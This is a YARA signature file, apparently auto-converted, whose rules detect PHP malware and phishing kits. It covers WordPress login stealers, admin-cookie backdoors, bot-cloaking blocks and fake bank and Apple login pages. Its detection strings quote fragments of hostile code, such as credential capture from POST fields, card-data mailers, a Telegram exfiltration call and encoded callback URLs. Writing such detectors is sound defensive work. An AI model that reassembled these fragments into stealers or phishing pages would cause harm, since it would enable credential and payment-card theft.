rule php_malware_tdsurl_001_03 : malware
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR05529 and PR05530
}

rule php_malware_test0_001 : malware
{
    strings:
        $trigger = "$SERVER_IP=str_replace(\".\",\"_\",$SERVER_IP);"
    condition:
        $trigger and PR00050 and PR00323
}

private rule PR05531 : trigger
{
    strings:
        $ps0 = "strtolower($_SERVER['REMOTE_ADDR']))){ exit();"
    condition:
        $ps0
}

rule php_malware_UA_check_009 : malware
{
    strings:
        $trigger = "abuse|amazonaws|anonym"
    condition:
        $trigger and PR00080 and PR00113 and PR05531
}

private rule PR05532 : trigger
{
    strings:
        $ps0 = "$time = filemtime($_SERVER['DOCUMENT_ROOT'].\"/\".$files[$i]);"
    condition:
        $ps0
}

rule php_malware_unreadable_dir_001 : malware
{
    strings:
        $trigger = "chmod(dirname(__FILE__), 0351);"
    condition:
        $trigger and PR02803 and PR05532
}

private rule PR05533 : trigger
{
    strings:
        $ps0 = "update.php\") AND stripos($new_version, $plugin_key)"
    condition:
        $ps0
}

rule php_malware_unwantedads_001 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05533 and PR02062
}

private rule PR05534 : trigger
{
    strings:
        $ps0 = "]));}}}};function"
    condition:
        $ps0
}

rule php_malware_unwantedads_002 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR05534 and PR01225 and PR01325
}

private rule PR05535 : trigger
{
    strings:
        $ps0 = "!is_admin()"
    condition:
        $ps0
}

private rule PR05536 : trigger
{
    strings:
        $ps0 = "apu.php?zoneid="
    condition:
        $ps0
}

rule php_malware_unwantedads_003 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00050 and PR05535 and PR05536
}

private rule PR05537 : trigger
{
    strings:
        $ps0 = "*/@upsme("
    condition:
        $ps0
}

rule php_malware_upsme_001 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00050 and PR05537
}

rule php_malware_usort_001 : malware
{
    strings:
        $trigger = "usort($_GET,"
    condition:
        $trigger
}

rule php_malware_varlog_001 : malware
{
    strings:
        $trigger = "; $output = ob_get_clean(); $fp = fopen('./error_log', 'a'); fwrite($fp,"
    condition:
        $trigger and PR03133
}

private rule PR05538 : trigger
{
    strings:
        $ps0 = "(\"CmlmKCFkZWZpbmVkKCJDVVJfUEFUSCIpKXsKCWRlZmluZSgiQ1VSX1BB"
    condition:
        $ps0
}

rule php_malware_visitor_tracker_002 : malware
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR05538
}

rule php_malware_visitor_tracker_002_01 : malware
{
    strings:
        $trigger = "(\"CmZ1bmN0aW9uIHVzZXJfYWJvcnRfZW5kX2V4aXRfb3BlcmF0aW9uaW"
    condition:
        $trigger and PR00029
}

private rule PR05539 : trigger
{
    strings:
        $ps0 = "\"));?><!--"
    condition:
        $ps0
}

private rule PR05540 : trigger
{
    strings:
        $ps0 = "e\";eval($"
    condition:
        $ps0
}

rule php_malware_visitor_tracker_003 : malware
{
    strings:
        $trigger = "--><?php"
    condition:
        $trigger and PR05539 and PR05540
}

rule php_malware_visitor_tracker_052F_001 : malware
{
    strings:
        $trigger = "echo base64_decode(\"PHNjcmlwdCB0eXBlPSJ0ZXh0L2p"
    condition:
        $trigger
}

private rule PR05541 : trigger
{
    strings:
        $ps0 = "attachment; filename=\".$_SERVER[\"HTTP_HOST\"].\".exe\");"
    condition:
        $ps0
}

rule php_malware_win32_trojan_001 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05541 and PR01479
}

private rule PR05542 : trigger
{
    strings:
        $ps0 = "if(!$_COOKIE[\"sid\"]){die();}"
    condition:
        $ps0
}

rule php_malware_win32_trojan_002 : malware
{
    strings:
        $trigger = "eval"
    condition:
        $trigger and PR01422 and PR05542
}

private rule PR05543 : trigger
{
    strings:
        $ps0 = "* @subpackage Administration"
    condition:
        $ps0
}

rule php_malware_wp_admin_cookie_001 : malware
{
    strings:
        $trigger = "isset($_COOKIE[\"wpt\"]"
    condition:
        $trigger and PR01514 and PR05543
}

private rule PR05544 : trigger
{
    strings:
        $ps0 = "= get_user_by('id',1);"
    condition:
        $ps0
}

private rule PR05545 : trigger
{
    strings:
        $ps0 = "wp_redirect(user_admin_url())"
    condition:
        $ps0
}

rule php_malware_wp_admin_cookie_002 : malware
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR03723 and PR05544 and PR05545
}

private rule PR05546 : trigger
{
    strings:
        $ps0 = "usermeta where meta_key = 'wp_capabilities' and meta_value like '%administrator%' limit 1)"
    condition:
        $ps0
}

rule php_malware_wp_admin_cookie_003 : malware
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR05546 and PR03723 and PR05545
}

private rule PR05547 : trigger
{
    strings:
        $ps0 = "new WP_User_Query("
    condition:
        $ps0
}

private rule PR05548 : trigger
{
    strings:
        $ps0 = "[rand(0,sizeof($"
    condition:
        $ps0
}

rule php_malware_wp_admin_cookie_006 : malware
{
    strings:
        $trigger = "array('role' => strtr("
    condition:
        $trigger and PR05547 and PR02092 and PR05548
}

private rule PR05549 : trigger
{
    strings:
        $ps0 = ").mb_strlen("
    condition:
        $ps0
}

rule php_malware_wp_admin_cookie_006_02 : malware
{
    strings:
        $trigger = "array('role' => strtr("
    condition:
        $trigger and PR05549 and PR05547 and PR02092
}

rule php_malware_wp_fbprotered_001 : malware
{
    strings:
        $trigger = "function fbprotered"
    condition:
        $trigger and PR02092
}

rule php_malware_wp_login_stealer_001 : malware
{
    strings:
        $trigger = ".$_POST['log'].\"-------password=\".$_POST['pwd']."
    condition:
        $trigger and PR00437 and PR00301
}

private rule PR05550 : trigger
{
    strings:
        $ps0 = "mysql_query (\"UPDATE \".$table_prefix.\"users SET user_pass = '\".$_POST['hash'].\"' WHERE id =\".$_POST['id'])"
    condition:
        $ps0
}

rule php_malware_wp_login_stealer_002 : malware
{
    strings:
        $trigger = "die("
    condition:
        $trigger and PR05550 and PR01490
}

rule php_malware_wp_login_stealer_003 : malware
{
    strings:
        $trigger = "curl_exec($ch);curl_close($ch);return true;}get_pass_Html("
    condition:
        $trigger and PR03964 and PR04718
}

private rule PR05551 : trigger
{
    strings:
        $ps0 = ",$_POST);"
    condition:
        $ps0
}

rule php_malware_wp_login_stealer_004 : malware
{
    strings:
        $trigger = "strrev("
    condition:
        $trigger and PR05551 and PR01553 and PR01401 and PR02092
}

private rule PR05552 : trigger
{
    strings:
        $ps0 = ");if(empty($"
    condition:
        $ps0
}

private rule PR05553 : trigger
{
    strings:
        $ps0 = "base64_decode(\"aHR0cD"
    condition:
        $ps0
}

private rule PR05554 : trigger
{
    strings:
        $ps0 = ".base64_encode($_POST["
    condition:
        $ps0
}

rule php_malware_wp_login_stealer_005 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR01553 and PR05552 and PR05553 and PR03964 and PR05554
}

private rule PR05555 : trigger
{
    strings:
        $ps0 = "time()+"
    condition:
        $ps0
}

private rule PR05556 : trigger
{
    strings:
        $ps0 = "setcookie("
    condition:
        $ps0
}

rule php_malware_wp_login_stealer_005_02 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR01553 and PR05552 and PR03964 and PR05555 and PR05556 and PR05554
}

rule php_malware_wp_login_stealer_006 : malware
{
    strings:
        $trigger = "wp_authenticate($"
    condition:
        $trigger and PR01522
}

private rule PR05557 : trigger
{
    strings:
        $ps0 = "file_get_contents(\"https://api.telegram.or"
    condition:
        $ps0
}

rule php_malware_wp_login_stealer_007 : malware
{
    strings:
        $trigger = "wordwrap($"
    condition:
        $trigger and PR00042 and PR00281 and PR05557
}

rule php_malware_wp_login_stealer_008 : malware
{
    strings:
        $trigger = "@fwrite(fopen(\"./wp-content/logo.jpg\""
    condition:
        $trigger
}

private rule PR05558 : trigger
{
    strings:
        $ps0 = "if ( $usercheck instanceof WP_User"
    condition:
        $ps0
}

rule php_malware_wp_login_stealer_009 : malware
{
    strings:
        $trigger = "wp_authenticate_username_password($"
    condition:
        $trigger and PR05558 and PR01522
}

private rule PR05559 : trigger
{
    strings:
        $ps0 = "@unserialize(base64_decode(get_option("
    condition:
        $ps0
}

rule php_malware_wp_login_stealer_010 : malware
{
    strings:
        $trigger = "senddata($cdnUrl, $host, base64_encode(serialize($"
    condition:
        $trigger and PR00091 and PR00341 and PR00342 and PR05559
}

rule php_malware_wp_login_stealer_010_02 : malware
{
    strings:
        $trigger = "($user, $username, $password);"
    condition:
        $trigger and PR00091 and PR00341 and PR00342 and PR05559
}

private rule PR05560 : trigger
{
    strings:
        $ps0 = "hex2bin( '687474703a2f2f636f6e6e6563742e61706965732e6f72672f'"
    condition:
        $ps0
}

rule php_malware_wpnull_001_02 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05560
}

private rule PR05561 : trigger
{
    strings:
        $ps0 = "function PlgSystemXcalendar(&"
    condition:
        $ps0
}

private rule PR05562 : trigger
{
    strings:
        $ps0 = "class PlgSystemXcalendarJoomlaBase extends PlgSystemXcalendarBase {"
    condition:
        $ps0
}

rule php_malware_xcalendar_001 : malware
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR05561 and PR05562 and PR00070
}

// MANUAL FIX NECESSARY
rule php_malware_xor_data_002 : malware
{
    strings:
        $trigger = "*/"
        $php_malware_xor_data_002_r0 = /\^['\"]/
        $php_malware_xor_data_002_r1 = /[\w][\s]*\^[\s]*\$[\w]+;[\s]*'/
    condition:
        $trigger and $php_malware_xor_data_002_r0 and $php_malware_xor_data_002_r1
}

// MANUAL FIX NECESSARY
private rule PR05563 : trigger
{
    strings:
        $ps0 = " ^ "
    condition:
        $ps0
}

rule php_malware_xor_data_003 : malware
{
    strings:
        $trigger = "\\x7"
        $php_malware_xor_data_003_r0 = /\^[\s]*\".x[^;]+;[\s]*\$[\w]+\(\$[\w]+,[\s]*\".x/
    condition:
        $trigger and PR05563 and $php_malware_xor_data_003_r0
}

private rule PR05564 : trigger
{
    strings:
        $ps0 = "@preg_replace(\\$_SERVER['HTTP_X_{{PASSWORD}}'], \\$_SERVER['HTTP_X_CURRENT']"
    condition:
        $ps0
}

private rule PR05565 : trigger
{
    strings:
        $ps0 = "XYZ_Browser"
    condition:
        $ps0
}

rule php_malware_xyz_browser_001 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05564 and PR05565 and PR00357
}

rule php_phishing_126_com_001 : phishing
{
    strings:
        $trigger = "\"Location:http://webmail.mail.126.com/\""
    condition:
        $trigger and PR00273
}

rule php_phishing_16shop_001 : phishing
{
    strings:
        $trigger = "<h3>16SHOP"
    condition:
        $trigger and PR00042
}

rule php_phishing_16shop_001_02 : phishing
{
    strings:
        $trigger = "<title>16SHOP"
    condition:
        $trigger
}

rule php_phishing_1and1_001 : phishing
{
    strings:
        $trigger = "<title>&#49;&#38;&#49;&#32;&#73;&#79;&#78;&#79;&#83;"
    condition:
        $trigger
}

private rule PR05566 : trigger
{
    strings:
        $ps0 = "\"ABSA |"
    condition:
        $ps0
}

rule php_phishing_absa_001 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03580 and PR00431 and PR05566
}

rule php_phishing_adobe_001 : phishing
{
    strings:
        $trigger = "Adobe PDF Online</h1>"
    condition:
        $trigger and PR00042
}

rule php_phishing_adobe_002 : phishing
{
    strings:
        $trigger = "<title>Access to PDF Files On Adobe Server"
    condition:
        $trigger and PR00281 and PR00247
}

rule php_phishing_amazon_001 : phishing
{
    strings:
        $trigger = "?action=billing_login=true&_session;\".md5(time()).md5(time()); ?>"
    condition:
        $trigger and PR00289
}

rule php_phishing_amazon_002 : phishing
{
    strings:
        $trigger = "header(\"Location: Billing.php?action=billing_verification=true&_session;\".md5(time()).md5(time()));"
    condition:
        $trigger
}

rule php_phishing_amazon_003 : phishing
{
    strings:
        $trigger = "$cardnumber|$newCreditCardMonth|$newCreditCardYear|$cvv"
    condition:
        $trigger and PR00289
}

rule php_phishing_amazon_004 : phishing
{
    strings:
        $trigger = "verification&securessl=true&sessionid=<?php  echo generateRandomString("
    condition:
        $trigger and PR00289
}

rule php_phishing_amazon_005 : phishing
{
    strings:
        $trigger = ">Verify your details</title>"
    condition:
        $trigger and PR00042
}

rule php_phishing_amazon_006 : phishing
{
    strings:
        $trigger = ">Amazon Sign In</title>"
    condition:
        $trigger and PR00042
}

rule php_phishing_amazon_007 : phishing
{
    strings:
        $trigger = "<title>Account Verification"
    condition:
        $trigger
}

rule php_phishing_amazon_008 : phishing
{
    strings:
        $trigger = "\xc2\xa9 1996-2018, Amazon.com, Inc. or its affiliates"
    condition:
        $trigger and PR00042
}

rule php_phishing_amazon_009 : phishing
{
    strings:
        $trigger = "&Alpha;m&#97;zon.com, Inc."
    condition:
        $trigger and PR00042
}

rule php_phishing_amazon_010 : phishing
{
    strings:
        $trigger = "<title>Amazon |"
    condition:
        $trigger and PR00046
}

private rule PR05567 : trigger
{
    strings:
        $ps0 = "] Mengupload Foto CC"
    condition:
        $ps0
}

rule php_phishing_amazon_011 : phishing
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR05567 and PR01021
}

private rule PR05568 : trigger
{
    strings:
        $ps0 = "if (stripos(strtolower(get_user_agent()), 'bot') !== false)"
    condition:
        $ps0
}

rule php_phishing_amazon_012 : phishing
{
    strings:
        $trigger = "_SERVER['REMOTE_ADDR"
    condition:
        $trigger and PR05568 and PR02741
}

rule php_phishing_anonisma_free_tools_001 : phishing
{
    strings:
        $trigger = "ANONISMA FREE TOOLS"
    condition:
        $trigger and PR00507
}

private rule PR05569 : trigger
{
    strings:
        $ps0 = "ANONISMA"
    condition:
        $ps0
}

private rule PR05570 : trigger
{
    strings:
        $ps0 = "md5(gmdate"
    condition:
        $ps0
}

rule php_phishing_anonisma_free_tools_002 : phishing
{
    strings:
        $trigger = "<div class=\\\"a-n-o-n-i-s-m-a\\\" id=\\\""
    condition:
        $trigger and PR05569 and PR00507 and PR05570
}

private rule PR05571 : trigger
{
    strings:
        $ps0 = "<form action=\\\"./account/successfully.php?id=\""
    condition:
        $ps0
}

rule php_phishing_anonisma_free_tools_003 : phishing
{
    strings:
        $trigger = "md5(gmdate"
    condition:
        $trigger and PR05569 and PR05571 and PR00507
}

rule php_phishing_anonisma_free_tools_004 : phishing
{
    strings:
        $trigger = "Coded By Anonisma"
    condition:
        $trigger and PR00732
}

private rule PR05572 : trigger
{
    strings:
        $ps0 = "$_SESSION['ANONISMA-"
    condition:
        $ps0
}

rule php_phishing_anonisma_free_tools_005 : phishing
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR05572
}

private rule PR05573 : trigger
{
    strings:
        $ps0 = "<title>AOL -&nbsp;login</title>"
    condition:
        $ps0
}

rule php_phishing_aol_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05573
}

private rule PR05574 : trigger
{
    strings:
        $ps0 = "'From: AOL CYX"
    condition:
        $ps0
}

rule php_phishing_aol_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00301 and PR05574
}

rule php_phishing_aol_002_02 : phishing
{
    strings:
        $trigger = "header(\"Location:https://aol.com/uploads\");"
    condition:
        $trigger
}

private rule PR05575 : trigger
{
    strings:
        $ps0 = "aW5mby55YWhvby5jb21cXFwvcHJpdmFjeVxcXC91c1xcXC95YWhvb1xcXC9yZWxldmFudGFkcy5odG1s"
    condition:
        $ps0
}

rule php_phishing_aol_002_03 : phishing
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR05575 and PR01479
}

private rule PR05576 : trigger
{
    strings:
        $ps0 = "login.aol.com/account/"
    condition:
        $ps0
}

rule php_phishing_aol_003 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR05576 and PR00046
}

rule php_phishing_apple_001 : phishing
{
    strings:
        $trigger = "&Alpha;ppleSecure"
    condition:
        $trigger and PR00042
}

rule php_phishing_apple_002 : phishing
{
    strings:
        $trigger = "&Alpha;pple Inc"
    condition:
        $trigger and PR00042
}

rule php_phishing_apple_003 : phishing
{
    strings:
        $trigger = "&Alpha;pple ID"
    condition:
        $trigger and PR00042
}

rule php_phishing_apple_004 : phishing
{
    strings:
        $trigger = "AppIe ID</title>"
    condition:
        $trigger and PR00042
}

rule php_phishing_apple_005 : phishing
{
    strings:
        $trigger = "AppleSecure</title>"
    condition:
        $trigger and PR00042
}

rule php_phishing_apple_006 : phishing
{
    strings:
        $trigger = "header('location: https://appleid.apple.com"
    condition:
        $trigger
}

rule php_phishing_apple_007 : phishing
{
    strings:
        $trigger = "header(\"Host: appleid.apple.com\");"
    condition:
        $trigger
}

rule php_phishing_apple_008 : phishing
{
    strings:
        $trigger = "echo \"<script type='text/javascript'>window.top.location='https://appleid.apple.com"
    condition:
        $trigger and PR00273 and PR01403
}

rule php_phishing_AXA_001 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.axabanque"
    condition:
        $trigger
}

rule php_phishing_AXA_002 : phishing
{
    strings:
        $trigger = "msg = \"--------------------- Bismillah --"
    condition:
        $trigger and PR00301
}

rule php_phishing_backofbrazil_001 : phishing
{
    strings:
        $trigger = "echo \"Pes\\x73\\x6fa"
    condition:
        $trigger
}

private rule PR05577 : trigger
{
    strings:
        $ps0 = "usuario BANCOLOMBIA (\".$ip"
    condition:
        $ps0
}

rule php_phishing_bancolombia_001 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05577
}

rule php_phishing_banker_001 : phishing
{
    strings:
        $trigger = "$subject = get_client_ip() . ' | CAIXA"
    condition:
        $trigger and PR01330
}

rule php_phishing_bankia_001 : phishing
{
    strings:
        $trigger = "Bankia S.A"
    condition:
        $trigger and PR00042
}

rule php_phishing_bankofamerica_001 : phishing
{
    strings:
        $trigger = "Bmnx vf Matircm"
    condition:
        $trigger and PR00042
}

rule php_phishing_bankofamerica_002 : phishing
{
    strings:
        $trigger = "Bank of America, N.A. Member FDIC"
    condition:
        $trigger and PR00042
}

private rule PR05578 : trigger
{
    strings:
        $ps0 = "<title>:::  BOI  :::"
    condition:
        $ps0
}

rule php_phishing_bankofireland_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05578
}

rule php_phishing_barclays_001 : phishing
{
    strings:
        $trigger = "header(\"Location: https://service.barclays.de"
    condition:
        $trigger
}

rule php_phishing_blackfriday_001 : phishing
{
    strings:
        $trigger = "<title>Aqui a Black Friday"
    condition:
        $trigger and PR00281
}

private rule PR05579 : trigger
{
    strings:
        $ps0 = "$blocked_words = array("
    condition:
        $ps0
}

private rule PR05580 : trigger
{
    strings:
        $ps0 = "cyveillance"
    condition:
        $ps0
}

rule php_phishing_block_bots_001 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR05579 and PR05580
}

private rule PR05581 : trigger
{
    strings:
        $ps0 = "'above','google','softlayer"
    condition:
        $ps0
}

rule php_phishing_block_bots_002 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR05579 and PR05581
}

private rule PR05582 : trigger
{
    strings:
        $ps0 = "array(\"above\", \"google\", \"softlayer\", \"amazonaws\", \"cyveillance\", \"phishtank\""
    condition:
        $ps0
}

rule php_phishing_block_bots_002_02 : phishing
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR05582
}

private rule PR05583 : trigger
{
    strings:
        $ps0 = "function CheckCVV($"
    condition:
        $ps0
}

rule php_phishing_block_bots_003 : phishing
{
    strings:
        $trigger = "if ( stripos($_SERVER['HTTP_USER_AGENT'], $spider) !== false ) return true"
    condition:
        $trigger and PR05583
}

rule php_phishing_block_bots_004 : phishing
{
    strings:
        $trigger = "echo(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");}}if(!empty($_SERVER['HTTP_USER_AGENT'])){"
    condition:
        $trigger and PR02764
}

rule php_phishing_block_bots_005 : phishing
{
    strings:
        $trigger = "if (preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR']))"
    condition:
        $trigger and PR02764
}

// MANUAL FIX NECESSARY
rule php_phishing_block_bots_006 : phishing
{
    strings:
        $trigger = "exit(header('Location: http"
        $php_phishing_block_bots_006_r0 = /\)[\s]*{[\s]*if[\s]*\(preg_match\('\/'[\s]*.[\s]*\$/
    condition:
        $trigger and PR03964 and $php_phishing_block_bots_006_r0
}

private rule PR05584 : trigger
{
    strings:
        $ps0 = "){if(preg_match('/'.$"
    condition:
        $ps0
}

private rule PR05585 : trigger
{
    strings:
        $ps0 = ".*\",\"^"
    condition:
        $ps0
}

rule php_phishing_block_bots_007 : phishing
{
    strings:
        $trigger = "<h1>404 Not Found</h1>The page"
    condition:
        $trigger and PR05584 and PR03964 and PR05449 and PR05585
}

rule php_phishing_block_bots_008 : phishing
{
    strings:
        $trigger = ".md5(base64_encode(rand(0,10000).gmdate("
    condition:
        $trigger and PR00273
}

rule php_phishing_block_bots_009 : phishing
{
    strings:
        $trigger = "gethostbyaddr($_SERVER['REMOTE_ADDR"
    condition:
        $trigger and PR04266 and PR05579 and PR02741
}

private rule PR05586 : trigger
{
    strings:
        $ps0 = "fopen(\".htaccess"
    condition:
        $ps0
}

rule php_phishing_block_bots_010 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR01403 and PR05586
}

private rule PR05587 : trigger
{
    strings:
        $ps0 = "window.location.replace("
    condition:
        $ps0
}

private rule PR05588 : trigger
{
    strings:
        $ps0 = "$blocked_words ="
    condition:
        $ps0
}

rule php_phishing_block_bots_011 : phishing
{
    strings:
        $trigger = "gethostbyaddr($_SERVER['REMOTE_ADDR"
    condition:
        $trigger and PR05587 and PR05588 and PR02741
}

private rule PR05589 : trigger
{
    strings:
        $ps0 = "logger(\"[BOT] {$_SERVER['REQUEST_URI']} - 500\");"
    condition:
        $ps0
}

rule php_phishing_block_bots_012 : phishing
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR05589
}

private rule PR05590 : trigger
{
    strings:
        $ps0 = "base64_encode(time().sha1($_SERVER["
    condition:
        $ps0
}

rule php_phishing_block_bots_013 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR00341 and PR05590
}

private rule PR05591 : trigger
{
    strings:
        $ps0 = "$click = fopen(\"snsv_blocklist.txt\",\"a\");"
    condition:
        $ps0
}

rule php_phishing_block_bots_014 : phishing
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR05591
}

private rule PR05592 : trigger
{
    strings:
        $ps0 = ") { shell_exec($"
    condition:
        $ps0
}

private rule PR05593 : trigger
{
    strings:
        $ps0 = "if(preg_match(\"/^<[^\\/](?!php).*>$/\", \"$"
    condition:
        $ps0
}

rule php_phishing_block_bots_015 : phishing
{
    strings:
        $trigger = "if (is_dir($dir"
    condition:
        $trigger and PR05592 and PR05593 and PR04000 and PR04002
}

private rule PR05594 : trigger
{
    strings:
        $ps0 = "antibot"
    condition:
        $ps0
}

rule php_phishing_block_bots_016 : phishing
{
    strings:
        $trigger = "if($Antibot->check()"
    condition:
        $trigger and PR05594 and PR02741 and PR03964
}

private rule PR05595 : trigger
{
    strings:
        $ps0 = ")!==false){exit(header('Location"
    condition:
        $ps0
}

rule php_phishing_block_bots_017 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01362 and PR03188 and PR05595
}

private rule PR05596 : trigger
{
    strings:
        $ps0 = "<title>BPI Online"
    condition:
        $ps0
}

rule php_phishing_BPI_001 : phishing
{
    strings:
        $trigger = "Login"
    condition:
        $trigger and PR05596
}

rule php_phishing_brphisher_001 : phishing
{
    strings:
        $trigger = "<?php echo(\"<b>Conta:&nbsp;</b>\".$_POST['conta'].\"\");?><?php echo(\"-\".$_POST['digito'].\"\");?></td>"
    condition:
        $trigger
}

rule php_phishing_brphisher_002 : phishing
{
    strings:
        $trigger = "$conteudo =\"<b>INFO:</b> $agencia $conta-$digito <b>SH4:</b> $infor <b>SH6:</b> $resultado_ss6 <b>CPF:</b> $cpf<br>\";"
    condition:
        $trigger and PR00301
}

rule php_phishing_brphisher_003 : phishing
{
    strings:
        $trigger = "$conteudo.=\"<b>CARD:</b> $ver01-$ver02-$ver03-$ver04 <b>VAL:</b> $mes/$ano <b>V/T:</b> $via-$tip <b>CVV:</b> $cvv<br>\";"
    condition:
        $trigger and PR00301
}

rule php_phishing_cc_mailer_001 : phishing
{
    strings:
        $trigger = "$msg=$name.\"<br/>\".$num.\"<br/>\".$mon.\"<br/>\".$yr.\"<br/>\".$cid.\"<br/> ok\";"
    condition:
        $trigger and PR00301
}

private rule PR05597 : trigger
{
    strings:
        $ps0 = "$email_message .= \"CCExpiresYear: \".clean_string($CCExpiresYear).\"\\n\";"
    condition:
        $ps0
}

rule php_phishing_cc_mailer_002 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05597
}

rule php_phishing_cc_mailer_003 : phishing
{
    strings:
        $trigger = "$cardInfo = bankDetails($card_number);"
    condition:
        $trigger and PR00042 and PR00281
}

rule php_phishing_centurylink_001 : phishing
{
    strings:
        $trigger = "title>Centurylink | Login</title>"
    condition:
        $trigger and PR00042
}

private rule PR05598 : trigger
{
    strings:
        $ps0 = "<title>&#67;&#104;&#97;&#115;&#101;&#32;&#66;&#97;&#110;&#107"
    condition:
        $ps0
}

rule php_phishing_chasebank_001 : phishing
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR05598
}

private rule PR05599 : trigger
{
    strings:
        $ps0 = "header('location:https://www.chase.com/digital/resources/privacy-security"
    condition:
        $ps0
}

rule php_phishing_chasebank_002 : phishing
{
    strings:
        $trigger = "if(!preg_match('/(android|"
    condition:
        $trigger and PR05599
}

rule php_phishing_chasebank_003 : phishing
{
    strings:
        $trigger = "<title>Update Your Account - chase"
    condition:
        $trigger
}

rule php_phishing_chasebank_004 : phishing
{
    strings:
        $trigger = "chase-com</title>"
    condition:
        $trigger and PR00042
}

rule php_phishing_chasebank_005 : phishing
{
    strings:
        $trigger = "&#x2D;&#x20;&#x43;&#x68;&#x61;&#x73;&#x65;&#x20;&#x55;&#x53;"
    condition:
        $trigger and PR00042
}

rule php_phishing_chasebank_006 : phishing
{
    strings:
        $trigger = "&#x63;&#x68;&#x61;&#x73;&#x65;&#x2E;&#x63;&#x6F;&#x6D;"
    condition:
        $trigger and PR00042
}

private rule PR05600 : trigger
{
    strings:
        $ps0 = "refresh\" content=\"0; URL=https://chase.com"
    condition:
        $ps0
}

rule php_phishing_chasebank_007 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00507 and PR04024 and PR05600
}

rule php_phishing_chasebank_008 : phishing
{
    strings:
        $trigger = "chase.com/web/auth"
    condition:
        $trigger and PR00042
}

private rule PR05601 : trigger
{
    strings:
        $ps0 = "[ -CHASE-SPOX-"
    condition:
        $ps0
}

rule php_phishing_chasebank_009 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR05601
}

private rule PR05602 : trigger
{
    strings:
        $ps0 = "&#99;&#104;&#97;&#115;&#101;"
    condition:
        $ps0
}

rule php_phishing_chasebank_010 : phishing
{
    strings:
        $trigger = "<form"
    condition:
        $trigger and PR00042 and PR05602
}

private rule PR05603 : trigger
{
    strings:
        $ps0 = "aypal"
    condition:
        $ps0
}

private rule PR05604 : trigger
{
    strings:
        $ps0 = "function getStr("
    condition:
        $ps0
}

private rule PR05605 : trigger
{
    strings:
        $ps0 = "explode($end"
    condition:
        $ps0
}

private rule PR05606 : trigger
{
    strings:
        $ps0 = "$start"
    condition:
        $ps0
}

rule php_phishing_checker_001 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05603 and PR05604 and PR05605 and PR05606
}

rule php_phishing_checker_002 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01392 and PR05604 and PR05605 and PR05606
}

private rule PR05607 : trigger
{
    strings:
        $ps0 = "fputs($fp, \"IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\\r\\n\");"
    condition:
        $ps0
}

rule php_phishing_checker_003 : phishing
{
    strings:
        $trigger = "_SERVER['REMOTE_ADDR"
    condition:
        $trigger and PR05607
}

rule php_phishing_china_001 : phishing
{
    strings:
        $trigger = "<title>&#37038;&#31665;&#26356;&#26032;&#35774;&#32622;"
    condition:
        $trigger
}

rule php_phishing_china_001_02 : phishing
{
    strings:
        $trigger = "&#21319;&#32423;&#20320;&#30340;&#37038;&#31665;"
    condition:
        $trigger and PR00042
}

private rule PR05608 : trigger
{
    strings:
        $ps0 = "3C%74%69%74%6C%65%3E%43%49%42%43%20"
    condition:
        $ps0
}

rule php_phishing_cibc_001 : phishing
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR05608
}

rule php_phishing_cibc_001_02 : phishing
{
    strings:
        $trigger = "<title>CIBC Verification</title>"
    condition:
        $trigger
}

private rule PR05609 : trigger
{
    strings:
        $ps0 = "3C%74%69%74%6C%65%3E%50%65%72%73%6F%6E%61%6C%20%42%61%6E%6B%69%6E%67"
    condition:
        $ps0
}

rule php_phishing_cibc_001_03 : phishing
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR05609 and PR00050
}

rule php_phishing_cielo_mailer_001 : phishing
{
    strings:
        $trigger = "= \"From: Cielo <"
    condition:
        $trigger and PR00301
}

rule php_phishing_citibank_001 : phishing
{
    strings:
        $trigger = "var domainName='online.citi.com';"
